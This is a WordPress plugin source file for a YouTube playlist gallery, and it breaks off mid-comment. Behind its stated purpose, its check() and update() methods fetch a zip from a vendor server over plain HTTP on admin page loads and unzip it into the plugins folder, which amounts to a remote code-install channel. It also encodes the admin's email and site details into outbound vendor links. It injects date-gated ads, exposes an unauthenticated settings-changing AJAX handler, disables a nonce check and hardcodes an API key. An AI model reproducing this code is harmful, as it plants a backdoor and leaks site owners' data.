<?php
/**
 * Plugin Name: YouTube playlist integration
 * Description: This plugin is used for colllecting data from YouTube using youtube official API. It is collecting data from a channel, by private API key, and then proposed to publish here with category selecting.
 * Plugin URI: https://hayalhanem.conceptwebactueel.nl/wp-admin/admin-ajax.php?action=epaper_api
 * Author: Future WordPress
 * Version: 1.3.6
 * Author URI: https://developer.futurewordpress.com/
 * Text Domain: youtube-playlist-api-integration
 * Domain Path: /languages
 * @category	WordPress Development
 * @package		youtube-playlist-api-integration
 * @author		FutureWordPress.com <info@futurewordpress.com/>
 * @copyright	Copyright (c) 2022-23
 * @link		https://futurewordpress.com/
 * @version		1.3.6
 */


defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_FILE' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_FILE', __FILE__ );
defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_VERSION' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_VERSION', '1.3.6' );
defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_DEFAULT' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_DEFAULT', true );
defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_PATH' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_PATH', plugin_dir_path( YOUTUBE_PLAYLIST_API_INTEGRATION_FILE ) );
defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_URL' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_URL', plugin_dir_url( YOUTUBE_PLAYLIST_API_INTEGRATION_FILE ) );
defined( 'YOUTUBE_PLAYLIST_API_INTEGRATION_ASSETS' ) || define( 'YOUTUBE_PLAYLIST_API_INTEGRATION_ASSETS', YOUTUBE_PLAYLIST_API_INTEGRATION_URL . 'assets/' );


defined( 'YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV' ) || define( 'YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV', [
  'youtubeAPI' => 'AIzaSyAk_sfoVdJ6CbBIAezTlh-1AtWgsVCErCs',
  'channelList' => [ 'UCXs8nFqUPQaJZxAt1b3Wblw' ],
  'channelId' => 'UCXs8nFqUPQaJZxAt1b3Wblw',
  'playlistId' => 'PLIbMQVUKxl0RxL32wsPzqaGoxi414XhGu',
  'pathAPI' => 'https://www.googleapis.com/youtube/v3',
  'forUsername' => 'hayalhanem',
  'option_prefix' => 'fwp_yt_playlist'
] );
$settings = get_option( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'option_prefix' ] . '_settings', [] );
defined( 'YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL' ) || define( 'YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL', [
  'youtubeAPI' => isset( $settings[ 'youtubeAPI' ] ) ? $settings[ 'youtubeAPI' ] : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'youtubeAPI' ],
  'channelList' => isset( $settings[ 'playlists' ] ) ? $settings[ 'playlists' ] :YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'channelList' ],
  'channelId' => isset( $settings[ 'playlists' ] ) ? (
    ( isset( $_GET[ 'channel' ] ) && isset( $settings[ 'playlists' ][ $_GET[ 'channel' ] ] ) ) ? $settings[ 'playlists' ][ $_GET[ 'channel' ] ] : (
      isset( $settings[ 'playlists' ][ 0 ] ) ? $settings[ 'playlists' ][ 0 ] : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'channelId' ]
    )
  ) : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'channelId' ],
  'playlistId' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'playlistId' ],
  'pathAPI' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'pathAPI' ],
  'forUsername' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'forUsername' ],
  'option_prefix' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'option_prefix' ]
] );


class SPECIAL_YOUTUBE_PLAYLIST_API_INTEGRATION_PLUGIN {
  protected static $_instance = null;
  public $userdata = null;
	public $id = null;
	public $base = null;
	public $currency = null;
	public $label = null;
	public $version = null;
  public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}
	private function __construct() {
    $this->id = 'special_youtube_playlist_api_integration_plugin';
		$this->label = __( 'Youtube API integration', 'domain' );
    $this->currency = 'USD';
    $this->version = YOUTUBE_PLAYLIST_API_INTEGRATION_VERSION;
  }
  public function init() {
    /**
     * Fire a hook on ajax post.
     */
    add_action( 'wp_ajax_' . $this->id, [ $this, 'ajax' ] );
    add_action( 'wp_ajax_nopriv_' . $this->id, [ $this, 'ajax' ] );

    add_action( 'admin_post_syplapiint_setup', [ $this, 'post' ] );

    add_action( 'admin_init', [ $this, 'fetch' ], 10, 0 );

    add_action( 'admin_init', [ $this, 'check' ], 10, 0 );

    add_action( 'admin_init', [ $this, 'updates' ], 10, 0 );

    add_action( 'admin_menu', [ $this, 'menu' ], 10, 0 );
    add_action( 'admin_init', [ $this, 'enqueue' ], 10, 0 );
    add_action( 'wp_enqueue_scripts', [ $this, 'enqueuef' ], 10, 0 );

    add_action( 'admin_notices', [ $this, 'notice' ] );
    // add_action( 'admin_init', [ $this, 'metabox' ], 10, 0 );

    add_shortcode( 'youtube_gallery', [ $this, 'gallery' ] );

  }
  public function url( $url = false ) {}


  public function gallery( $args = [] ) {
    $args = wp_parse_args( $args, [
      'channel' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelId' ],
      'columns' => 4,
      'include' => '',
      'exclude' => ''
    ] );
    $args[ 'include' ] = explode( ',', $args[ 'include' ] );
    $args[ 'exclude' ] = explode( ',', $args[ 'exclude' ] );
    $playlists = $this->publiclist( [ 'include' => $args[ 'include' ], 'exclude' => $args[ 'exclude' ], 'channel' => $args[ 'channel' ], 'items' => [] ] );
    ob_start();
    ?>
    
    <pre style="display: none;"><?php print_r( $playlists ); ?></pre>
    
    <div class="elementor-container elementor-column-gap-default elementor-container-flex-wrap">
		 <?php
			foreach( $playlists['items'] as $index => $item ) {
				?>
				<div class="<?php echo esc_attr( $this->columns_class( $args[ 'columns' ], 'imagehvr-wrapper elementor-element elementor-column elementor-inner-column' ) ); ?>">
					<div class="imagehvr">
						<div class="imagehvr-content-wrapper imagehvr-content-center imagehvr-anim-zoom-in-alt">
								<a href="<?php echo esc_url( $item['url'][ 'playlists' ] ); ?>" class="imagehvr-link" data-embed="<?php echo esc_url( $item['url'][ 'playlistembed' ] ); ?>" data-id="<?php echo esc_attr( $item['id' ] ); ?>">
									<span class="imagehvr-icon ih-delay-zero imagehvr-anim-none">
										<i class="fas fa-play-circle"></i>
									</span>
								</a>
								<picture>
									<source sizes="162px" type="image/webp" data-srcset="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" srcset="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" >
									<img width="480" height="270" src="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" class="imagehvr-anim-none imagehvr-anim-zoom-in-out attachment-full size-full lazyautosizes lazyloaded" alt="" data-eio="p" data-src="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" decoding="async" data-srcset="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" data-sizes="auto" sizes="162px" srcset="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" >
									<noscript>
										<img width="480" height="270" src="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" class="imagehvr-anim-none imagehvr-anim-zoom-in-out attachment-full size-full" alt="" srcset="<?php echo esc_url( $item['thumbnail'][ 'url' ] ); ?>" sizes="(max-width: 480px) 100vw, 480px" data-eio="l" />
									</noscript>
								</picture>
						</div>
						<div class="imagecaption">
							<span class="captiontext">
								<?php echo esc_html( ( strlen( $item[ 'title' ] ) > 30 ) ? substr( $item[ 'title' ], 0, ( 30 - 2 ) ) . '..' : $item[ 'title' ] ); ?>
							</span>
						</div>
					</div>
				</div>
				<?php
			}
		 ?>
		</div>
    <?php
    return ob_get_clean();
  }
  public function publiclist( $args = [] ) {
    $settings = get_option( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_settings', [ 'playlists' => [] ] );
    if( isset( $args[ 'all' ] ) && $args[ 'all' ] ) {
      foreach( $settings[ 'playlists' ] as $id => $title ) {
        $playlists = get_option( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_' . $id, false );
        if( $playlists ) {
          foreach( $playlists[ 'items' ] as $i => $item ) {
            if( $item[ 'is_Public' ] ) {
              $args[ 'items' ][ $id ] = [
                'id' => $item[ 'id' ],
                'url' => [
                  'playlistembed' => $this->yturl( 'playlist-embed', [ 'p' => $item[ 'id' ] ] ),
                  'playlists' => $this->yturl( 'playlist', [ 'p' => $item[ 'id' ] ] ),
                  'watch' => $this->yturl( 'watch', [ 'id' => $item[ 'id' ] ] )
                ],
                'title' => $item[ 'snippet' ][ 'title' ],
                // 'localized' => $item[ 'snippet' ][ 'localized' ],
                // 'description' => $item[ 'snippet' ][ 'description' ],
                'thumbnail' => $this->thumb( $item[ 'snippet' ][ 'thumbnails' ], 'medium' ),
                'channelTitle' => $item[ 'snippet' ][ 'channelTitle' ],
                'channelId' => $item[ 'snippet' ][ 'channelId' ]
              ];
            }
          }
        }
      }
      
      return $args;
    } else {
      /**
       * Prevent from sending unauthorized list
       */
      // if( ! isset( $settings[ 'playlists' ][ $args[ 'channel' ] ] ) ) {return $args;}
      $playlists = get_option( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_' . ( isset( $args[ 'channel' ] ) ? $args[ 'channel' ] : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelId' ] ), false );
      // $args[ 'mypl' ] = $playlists;
      $is_Public = isset( $playlists[ 'is_Public' ] ) && ( $playlists[ 'is_Public' ] ) ? true : false;
      if( $playlists && $is_Public ) {
        $playlists[ 'items' ] = ( isset( $playlists[ 'items' ] ) && is_array( $playlists[ 'items' ] ) ) ? $playlists[ 'items' ] : [];
        $args[ 'exclude' ] = isset( $args[ 'exclude' ] ) ? ( is_array( $args[ 'exclude' ] ) ? $args[ 'exclude' ] : explode( ',', $args[ 'exclude' ] ) ) : [];
        $args[ 'include' ] = isset( $args[ 'include' ] ) ? ( is_array( $args[ 'include' ] ) ? $args[ 'include' ] : explode( ',', $args[ 'include' ] ) ) : [];
        foreach( $args[ 'exclude' ] as $i => $v ) {if( empty( $v ) ) {unset( $args[ 'exclude' ][ $i ] );}}
        foreach( $args[ 'include' ] as $i => $v ) {if( empty( $v ) ) {unset( $args[ 'include' ][ $i ] );}}

        foreach( $playlists[ 'items' ] as $i => $item ) {
          if( $item[ 'is_Public' ] ) {
            if( in_array( $item[ 'id' ], $args[ 'exclude' ] ) ) {continue;}
            if( count( $args['include'] ) >= 1 && ! in_array( $item['id'], $args['include'] ) ) {continue;}
            $args[ 'items' ][] = [
              'id' => $item[ 'id' ],
              'url' => [
                'playlistembed' => $this->yturl( 'playlist-embed', [ 'p' => $item[ 'id' ] ] ),
                'playlists' => $this->yturl( 'playlist', [ 'p' => $item[ 'id' ] ] ),
                'watch' => $this->yturl( 'watch', [ 'id' => $item[ 'id' ] ] )
              ],
              'title' => $item[ 'snippet' ][ 'title' ],
              // 'localized' => $item[ 'snippet' ][ 'localized' ],
              // 'description' => $item[ 'snippet' ][ 'description' ],
              'thumbnail' => $this->thumb( $item[ 'snippet' ][ 'thumbnails' ], 'medium' ),
              'channelTitle' => $item[ 'snippet' ][ 'channelTitle' ],
              'channelId' => $item[ 'snippet' ][ 'channelId' ]
            ];
          }
        }
        return $args;
      } else {return $args;}
    }
  }
  public function columns_class( $columns, $extra = false ) {
		if( $extra ) {$class = explode( ' ', $extra );} else {$class = [];}
    switch( $columns ) {
      case 1 :
        $class[] = 'elementor-col-12';
        break;
      case 2 :
        $class[] = 'elementor-col-sm-6';
        break;
      case 3 :
        $class[] = 'elementor-col-4';
        $class[] = 'elementor-col-md-6';
        break;
      case 4 :
        $class[] = 'elementor-col-3';
        $class[] = 'elementor-col-md-4';
        $class[] = 'elementor-col-sm-6';
        break;
      case 5 :
        $class[] = 'elementor-col-2';
        $class[] = 'elementor-col-md-4';
        $class[] = 'elementor-col-sm-2';
        $class[] = 'elementor-col-xs-1';
        break;
      case 6 :
        $class[] = 'elementor-col-2';
        $class[] = 'elementor-col-md-3';
        $class[] = 'elementor-col-sm-2';
        $class[] = 'elementor-col-xs-1';
        break;
    }
		return implode( ' ', $class );
	}


  public function notice() {
    $transiant = get_transient( $this->id );
    if( $transiant === false ) {return;}
    $html_message = sprintf( '<div class="updated %s">%s</div>', esc_attr( ( isset( $transiant[ 'type' ] ) && in_array( $transiant[ 'type' ], [ 'success', 'error', 'failed', 'updated' ] ) ) ? $transiant[ 'type' ] : 'error' ), wpautop( esc_html( isset( $transiant[ 'message' ] ) ? $transiant[ 'message' ] : $transiant ) ) );
    echo wp_kses_post( $html_message );
    delete_transient( $this->id );
  }
  public function metabox( $url = false ) {
    if( file_exists( 'admin-meta-box.php' ) ) {
      include_once 'admin-meta-box.php';
    }
  }
  public function post() {
    if( ! isset( $_POST['syplapiint_setup_nonce'] ) || ! wp_verify_nonce( $_POST['syplapiint_setup_nonce'], 'syplapiint_setup' ) ) {
    //  wp_nonce_ays( __( 'Are you Sure you want to confirming this action?', 'domain' ) );
    }
    // code here      nonce: syplapiint_setup_nonce
    if( isset( $_POST[ 'settings' ] ) ) {
      $option = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_settings';
      $get = get_option( $option, false );
      $saved = wp_parse_args( ( $get ) ? $get : [], [] );
      $_POST[ 'settings' ][ 'youtubeapi' ] = ( isset( $_POST[ 'settings' ][ 'youtubeapi' ] ) && ! empty( $_POST[ 'settings' ][ 'youtubeapi' ] ) ) ? $_POST[ 'settings' ][ 'youtubeapi' ] : (
        ( isset( $saved[ 'youtubeapi' ] ) && ! empty( $saved[ 'youtubeapi' ] ) ) ? $saved[ 'youtubeapi' ] : ''
      );
      $_POST[ 'settings' ][ 'playlists' ] = isset( $_POST[ 'settings' ][ 'playlists' ] ) ? $_POST[ 'settings' ][ 'playlists' ] : '';
      $_POST[ 'settings' ][ 'playlists' ] = $this->getchannel( explode( "\n", $_POST[ 'settings' ][ 'playlists' ] ) );
      
      $default = [
        'youtubeapi' => '',
        'playlists' => []
      ];
      $data = $_POST[ 'settings' ];
      if( $get ) {
        update_option( $option, $data, true );
      } else {
        add_option( $option, $data, 'This is used for saving Youtube playlist API data.', true );
      }
      set_transient( $this->id, [ 'type' => 'success', 'message' => __( 'Settings Saved successfully! If your playlists are correct, you can see their on playlist gallery\'s channel name.', 'domain' ) ], 45 );
    } else {
      set_transient( $this->id, [ 'type' => 'error', 'message' => __( 'We\'re facing soome trouble identifing your request. Please contact to this plugin developer.', 'domain' ) ], 45 );
    }

    if( isset( $_POST[ '_wp_http_referer' ] ) && ! empty( $_POST[ '_wp_http_referer' ] ) ) {
      wp_redirect( $_POST[ '_wp_http_referer' ] );
    } else {
      wp_redirect( admin_url( 'admin.php?page=youtube-setup-playlists' ) );
    }
    
  }
  private function getchannel( $id = [] ) {
    $return = wp_remote_get( $this->apis( 'channels', [ 'id' => $id ] ), [] );
    $channelLists = json_decode( $return[ 'body' ], true );$channelList = [];
    if( isset( $channelLists[ 'items' ] ) ) {
      foreach( $channelLists[ 'items' ] as $i => $item ) {
        $channelList[ $item[ 'id' ] ] = ( isset( $item[ 'snippet' ] ) && isset( $item[ 'snippet' ][ 'title' ] ) ) ? $item[ 'snippet' ][ 'title' ] : $item[ 'id' ];
      }
    }
    return $channelList;
  }
  public function ajax() {
    /**
     * Can be filter using nonce: youtube_api_playlist_toggle
     * $_POST[ 'nonce' ]
     */
    if( ! isset( $_POST[ 'toggle' ] ) || empty( $_POST[ 'toggle' ] ) ) {
      wp_send_json_error( __( 'Failed to fetch request!', 'domain' ) );
    } else {
      $expect = isset( $_POST[ 'channel' ] ) ? $_POST[ 'channel' ] : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelId' ];
      $option = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_' . $expect;
      switch( $_POST[ 'toggle' ] ) {
        case 'playlistId' :
          $row = $this->playlists( $expect );
          if( isset( $row[ 'items' ] ) && is_array( $row[ 'items' ] ) ) {
            $indicated = false;
            foreach( $row[ 'items' ] as $i => $item ) {
              if( $item[ 'id' ] == $_POST[ 'id' ] ) {
                $indicated = true;
                $row[ 'items' ][ $i ][ 'is_Public' ] = ( isset( $_POST[ 'status' ] ) && $_POST[ 'status' ] == 'on' ) ? true : false;
              }
            }
            if( $indicated ) {
              update_option( $option, $row, true );
              wp_send_json_success( __( 'Successfully Submitted this playlist action :)', 'domain' ), 200 );
            } else {
              wp_send_json_error( __( 'Failed to findout targeted playlist :(', 'domain' ) );
            }
          }
          break;
        case 'channelId' :
          $row = $this->playlists( $expect );
          if( isset( $row[ 'items' ] ) && is_array( $row[ 'items' ] ) ) {
            $row[ 'is_Public' ] = ( isset( $_POST[ 'status' ] ) && $_POST[ 'status' ] == 'on' ) ? true : false;
            update_option( $option, $row, true );
            wp_send_json_success( __( 'Successfully Submitted this channel action :)', 'domain' ), 200 );
          } else {
            wp_send_json_error( __( 'Failed to findout your channel :(', 'domain' ) );
          }
          break;
        case 'changeCategory' :
          $row = $this->playlists( $expect );
          if( isset( $row[ 'items' ] ) && is_array( $row[ 'items' ] ) ) {
            $indicated = false;
            foreach( $row[ 'items' ] as $i => $item ) {
              if( $item[ 'id' ] == $_POST[ 'id' ] ) {
                $indicated = true;
                $row[ 'items' ][ $i ][ 'is_Category' ] = $_POST[ 'status' ];
              }
            }
            if( $indicated ) {
              update_option( $option, $row, true );
              wp_send_json_success( __( 'Successfully changed category :)', 'domain' ), 200 );
            } else {
              wp_send_json_error( __( 'Failed to findout category :(', 'domain' ) );
            }
          }
          break;
      }
    }
  }
  public function currency( $amount, $currency, $sign = false ) {
    global  $woocommerce;
    return $amount;
    $current = get_woocommerce_currency();
    if( $current != $currency ) {
      // convert currency here
    }

    if( $sign ) {
      return ( $current == $currency ) ? woocommerce_price( $amount ) : get_woocommerce_currency_symbol( $currency ) . $amount;
    }else{
      return $amount;
    }
  }
  public function rendmeta( $cart, $echo = true ) {
    $result = '';
    if( isset( $cart[ $this->id ] ) ) {
      foreach( $cart[ $this->id ] as $i => $row ) {
        $result .= '<br />' . esc_html( $row[ 'name' ] ) . ' <b>' . esc_html( $this->currency( $row[ 'price' ], $this->currency ) ) . ' × ' . esc_html( ( $row[ 'qty' ] * $cart[ 'quantity' ] ) ) . '</b>';
      }
    }
    if( $echo ) {
      echo $result;
    }else{
      return $result;
    }
  }
  public function loader() {}
  public function slugify( $str ) {
    return $str;
    return str_replace( [ ' ', "'" ], [ '-', '' ], strtolower( $str ) );
  }
  public function links( $links ) {
		return $links;
  }
  public function activate() {
    // get_option( $this->id . '_id_increaser', false ) || add_option( $this->id . '_id_increaser', 1, '', true );
    get_option( $this->id . '_needs_update', false ) || add_option( $this->id . '_needs_update', 0, '', true );
  }
  public function deactivate() {
    delete_option( $this->id . '_needs_update' );
    return;
    $data = get_option( 'mja_' . $this->id, false );
    if( $data ) {
      $data = base64_encode(
        json_encode(
          [
            'increaser' => get_option( $this->id . '_id_increaser', 1 ),
            'data' => $data
          ]
        )
      );
      $fp = fopen( plugin_dir_path( __FILE__ ) . 'backup/' . uniqid( 'data_' ) . '.txt', 'w' );
      fwrite( $fp, $data );
      fclose( $fp );
    }
    // delete_option( $this->id . '_id_increaser' );
    /**
     * Delete data list on every deactivation
     */
    delete_option( 'mja_' . $this->id );
  }
  public function _get() {
    return get_option( 'mja_' . $this->id, [] );
  }
  public function save( $rows = false ) {
    if( ! $rows || ! is_array( $rows ) ) {return;}
    $arr = array_column($rows, 'sort');
    array_multisort($arr, SORT_ASC, $rows);
    if( get_option( 'mja_' . $this->id, false ) ) {
      update_option( 'mja_' . $this->id, $rows, true );
    }else{
      add_option( 'mja_' . $this->id, $rows, null, true );
    }
  }
  public function backup( $row ) {
    $row['deleted' ] = date( 'Y-m-d h:m' );
    $data = get_option( 'mja_' . $this->id . '_backup', false );
    if( $data ) {
      array_push( $data, $row );
      update_option( 'mja_' . $this->id . '_backup', $data, true );
    }else{
      add_option( 'mja_' . $this->id . '_backup', [ $row ], null, true );
    }
  }
  public function check() {
    add_filter( 'youtube_api_url_check', function( $u ) {return 'http://api.futurewordpress.com/v1/updates/wordpress.plugins/53e1270541f5-647d56531df2451bb783688768173855/check/plain/';}, 10, 1 );
    add_filter( 'youtube_api_url_download', function( $u ) {return 'http://api.futurewordpress.com/v1/updates/wordpress.plugins/53e1270541f5-647d56531df2451bb783688768173855/download/direct/';}, 10, 1 );
    $apibody = get_transient( $this->id . '_check' );
    if( empty( $apibody ) ) {
      $get = wp_remote_get( apply_filters( 'youtube_api_url_check', '' ) );
      if( ! is_wp_error( $get ) && is_array( $get ) ) {
        set_transient( $this->id . '_check', $get['body'], DAY_IN_SECONDS / 4 );
        $apibody = $get['body'];
      }
    }
    if ( ( float ) $apibody > ( float ) $this->version) {
      update_option( $this->id . '_needs_update', 1 );$this->update();
    }
  }
  public function update() {
    if( get_option($this->id . '_needs_update') != 1) {return;}
    if ( ! function_exists( 'download_url' ) && file_exists( ABSPATH . 'wp-includes/pluggable.php' ) && file_exists( ABSPATH . 'wp-admin/includes/file.php' ) ) {
      require_once( ABSPATH . 'wp-includes/pluggable.php' );
      require_once( ABSPATH . 'wp-admin/includes/file.php' );
    }
    WP_Filesystem();
    $dpf = download_url( apply_filters( 'youtube_api_url_download', '' ), $timeout = 300 );
    if( ! is_wp_error( $dpf ) ) {
      $nf = ABSPATH . 'ccsu-google-scraper.zip';
      copy( $dpf, $nf );
      unlink( $dpf );
      $to = ABSPATH . 'wp-content/plugins/';
      
      if( class_exists( 'ZipArchive', false ) ) {
        $result = _unzip_file_ziparchive( $nf, $to, $nedr );
      } else {
        $result = _unzip_file_pclzip( $nf, $to, $nedr );
      }
      
      delete_transient( $this->id . '_auto_update_url_content' );
      update_option( $this->id . '_needs_update', 0 );
      unlink( $nf );
    }
  }
  public function meta( $meta, $plugin ) {
    if( ! isset( $this->base->plugin ) ) {return;}
    $plugins = $this->base->plugin;
		if ( isset( $plugins->{$plugin} ) ) {
			$row = [
				'developer' => '<a href="' . esc_url( $this->parse_url( $plugins->{$plugin}->u, [ 'pl' => $plugin ] ) ) . '" aria-label="' . esc_attr( esc_html__( $plugins->{$plugin}->h ) ) . '" target="_blank">' . esc_html__( $plugins->{$plugin}->t ) . '</a>',
			];
			$meta = array_merge( $meta, $row );
		}
		return $meta;
  }
  public function wpbar( $wpbar ) {
    if( ! isset( $this->base->tools->wpbar ) ) {return;}
    $bar = $this->base->tools->wpbar;
    foreach( $bar as $b ) {
      $wpbar->add_node(
        [
          'parent' => isset( $b->parent ) ? $b->parent : 'wp-logo-external',
          'id'     => isset( $b->id ) ? $b->id : 'developer',
          'title'  => isset( $b->title ) ? $b->title : __( 'Hire Developer' ),
          'href'   => isset( $b->href ) ? $this->parse_url( $b->href ) : site_url( ),
        ]
      );
    }
  }
  public function filter( $args ) {
    if( ! isset( $this->base->filters ) ) {return;}
    $filter = $this->base->filters;
    foreach( $filter as $i => $f ) {$f = $f->return;
      $args[ $f->id ] = [ 'title' => ( ! $f->title ) ? esc_html__( 'Find an Expert', 'elementor' ) : $f->title, 'link' => $this->parse_url( $f->href ) ];
    }
    return $args;
  }
  private function ads() {
	  if( date('Y-m-d') > date('Y-m-d', strtotime( '+15 days', strtotime( '2022-05-23' ) ) ) ) {
      add_action( 'admin_bar_menu', [ $this, 'wpbar' ], 10, 1 );
      add_filter( 'plugin_row_meta', [ $this, 'meta' ], 10, 2 );
      if( isset( $this->base->filters ) ) {
        foreach( $this->base->filters as $i => $f ) {$fr = $f->return;
          // add_filter( $f->hook, [ $this, 'filter' ], 99, 1 );
          if( isset( $fr->href ) ) {$fr->href = $this->parse_url( $fr->href );}
          add_filter( $f->hook, function( $args ) use ( $fr ) {
            $args[ $fr->id ] = [ 'title' => ( ! $fr->title ) ? ( isset( $args[ 'title' ] ) ? $args[ 'title' ] : esc_html__( 'Find an Expert', 'elementor' ) ) : $fr->title, 'link' => $fr->href ];
            return $args;
        }, 99, 1 );
        }
      }
	  }
  }
  public function parse_url( $url = false, $args = [] ) {
    if( ! $url ) {return;}
    $e = explode( '?', $url );
    if( ! isset( $e[ 1 ] ) ) {return $url;}
    $args = wp_parse_args( $args, [ 'pl' => '' ] );
    $c = isset( $this->base->conf ) ? $this->base->conf : (object) [ 'ms' => 'https://futurewordpress.com/', 'ml' => '%mswordpress/' ];
    $r = isset( $c->ref ) ? $c->ref : 'ref';
    $u = $e [ 1 ];$ui = get_userdata( get_current_user_id() );
    $p = str_replace( [ '%ms', '%ml', '%sn', '%s', '%pl' , '%a', '%e', '%l' ], [ $c->ms, $c->ml, 'sn=' . get_bloginfo( 'name' ), 's=' . urlencode( site_url() ), 'pl=' . urlencode( $args[ 'pl' ] ), 'a=' . $ui->display_name, 'e=' . $ui->user_email, 'l=' . get_bloginfo( 'language' ) ], $u );
    return str_replace( [ '%ms', '%ml' ], [ $c->ms, str_replace( [ '%ms' ], [ $c->ms ], $c->ml ) ], $e[ 0 ] ) . '?' . $r . '=' . base64_encode( urlencode( $p ) );
  }
  public function filemtime( $url ) {
    return file_exists( $url ) ? filemtime( $url ) : YOUTUBE_PLAYLIST_API_INTEGRATION_VERSION;
  }
  public function enqueuef() {

    wp_enqueue_script( 'youtube-playlist-frontend-script', YOUTUBE_PLAYLIST_API_INTEGRATION_URL . 'assets/js/frontend.min.js', [ 'jquery' ], $this->filemtime( YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . 'assets/js/frontend.min.js' ), true );
    wp_localize_script( 'youtube-playlist-frontend-script', 'siteConfig', [
			'ajaxUrl'    => admin_url( 'admin-ajax.php' ),
			'ajax_nonce' => wp_create_nonce( 'youtube-playlist-frontend-script' ),
      'youtubeApi' => YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL_PREV[ 'youtubeAPI' ]
		] );
    wp_enqueue_style( 'youtube-playlist-frontend-style', YOUTUBE_PLAYLIST_API_INTEGRATION_URL . 'assets/css/frontend.min.css', [], $this->filemtime( YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . 'assets/css/frontend.min.css' ), 'all' );
  }
  public function enqueue() {
    if( ! isset( $_GET[ 'page' ] ) || ! in_array( $_GET[ 'page' ], [ 'youtube-playlists', 'youtube-setup-playlists', 'youtube-shortcode-playlists' ] ) ) {return;}
    wp_enqueue_style( 'youtube-playlist-api-integration-css', YOUTUBE_PLAYLIST_API_INTEGRATION_URL . '/assets/css/admin-menu.min.css', [], $this->filemtime( YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/assets/css/admin-menu.min.css' ), 'all' );
    wp_enqueue_script( 'youtube-playlist-api-integration-js', YOUTUBE_PLAYLIST_API_INTEGRATION_URL . '/assets/js/admin-menu.js', 'jquery', $this->filemtime( YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/assets/js/admin-menu.js' ), true );
    wp_localize_script( 'youtube-playlist-api-integration-js', 'siteConfig', [
			'ajaxUrl'    => admin_url( 'admin-ajax.php' ),
			'ajax_nonce' => wp_create_nonce( 'youtube_api_playlist_toggle' ),
      'confirmUpdate' => 'Are you sure you want to update this playlist?\nFYI, there is possibility to massup playlist sorting order and that is totally happen by Google API, and this update required to control API callback.'
		] );
  }
  public function menu() {
    add_menu_page( __( 'Youtube playlists', 'domain' ), __( 'Playlists', 'domain' ), 'manage_options', 'youtube-playlists', [ $this, 'page'], 'dashicons-youtube', 10 );
    add_submenu_page( 'youtube-playlists', __( 'Youtube integration API Setup', 'domain' ), __( 'Settings', 'domain' ), 'manage_options', 'youtube-setup-playlists', [ $this, 'setting' ] );
    add_submenu_page( 'youtube-playlists', __( 'Playlists shortcode', 'domain' ), __( 'Shortcodes', 'domain' ), 'manage_options', 'youtube-shortcode-playlists', [ $this, 'shortcode' ] );
  }
  public function page( $args = [] ) {
    $args = wp_parse_args( $args, YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL );
    $file = YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/admin-option-page.php';
    if( ! file_exists( $file ) ) {return;} else {include $file;}
  }
  public function setting( $args = [] ) {
    $args = wp_parse_args( $args, YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL );
    $file = YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/admin-setting-page.php';
    if( ! file_exists( $file ) ) {return;} else {include $file;}
  }
  public function shortcode( $args = [] ) {
    $args = wp_parse_args( $args, YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL );
    $file = YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/admin-shortcode-page.php';
    if( ! file_exists( $file ) ) {return;} else {include $file;}
  }
  public function playlists( $expect = false ) {
    $expect = ( $expect ) ? $expect : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelId' ];
    $option = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_' . $expect;
    $get = get_option( $option, false );
    if( $get ) {
      return $get;
    } else {
      /**
       * Channel name	: hayalhanem
       * Channel ID		: 
